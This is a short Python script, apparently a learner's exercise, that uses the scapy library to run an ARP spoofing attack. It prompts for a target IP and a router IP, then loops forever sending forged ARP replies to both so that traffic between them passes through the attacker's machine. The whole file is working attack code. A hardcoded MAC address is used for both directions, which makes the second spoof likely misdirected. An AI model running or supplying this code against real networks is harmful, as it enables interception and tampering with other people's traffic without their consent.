import scapy.all as scapy
import time

def spoof(taget_ip,spoof_ip):
	pkt=scapy.ARP(op=2,pdst=taget_ip,hwdst="08:00:27:87:49:a3",psrc=spoof_ip)
	
	jadu= scapy.send(pkt)

taget_ip= input("enter target machine ip: ")
spoof_ip=input("enter router ip: ")
while True:
	spoof(taget_ip ,spoof_ip)
	spoof(spoof_ip, taget_ip)
	time.sleep(2)
